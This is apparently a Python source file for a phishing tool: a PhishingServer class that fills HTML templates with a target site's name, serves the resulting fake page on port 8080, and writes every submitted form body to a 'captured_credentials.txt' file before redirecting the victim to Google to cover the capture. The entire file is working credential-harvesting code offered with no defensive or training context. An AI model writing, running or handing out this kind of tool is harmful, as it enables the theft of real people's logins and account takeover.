#!/usr/bin/env python3

import os
import http.server
import socketserver
from rich.console import Console
from rich.prompt import Prompt
from jinja2 import Template

console = Console()

class PhishingServer:
    def __init__(self):
        self.port = 8080
        self.templates_dir = "templates/phishing"
        self.handler = self.create_handler()
        
    def create_handler(self):
        class CustomHandler(http.server.SimpleHTTPRequestHandler):
            def do_POST(self):
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')
                
                with open("output/captured_credentials.txt", "a") as f:
                    f.write(f"[+] Captured data: {post_data}\n")
                    
                self.send_response(301)
                self.send_header('Location', 'https://www.google.com')
                self.end_headers()
                
        return CustomHandler
        
    def create_template(self, template_name, target_site):
        """Create phishing page from template"""
        template_path = f"{self.templates_dir}/{template_name}.html"
        
        if not os.path.exists(template_path):
            console.print(f"[red]Template {template_name} not found![/red]")
            return False
            
        with open(template_path) as f:
            template = Template(f.read())
            
        output = template.render(target_site=target_site)
        
        with open("output/index.html", "w") as f:
            f.write(output)
            
        return True
        
    def start_server(self):
        """Start phishing web server"""
        try:
            with socketserver.TCPServer(("", self.port), self.handler) as httpd:
                console.print(f"[green]Server started at port {self.port}[/green]")
                httpd.serve_forever()
        except Exception as e:
            console.print(f"[red]Server error: {str(e)}[/red]") 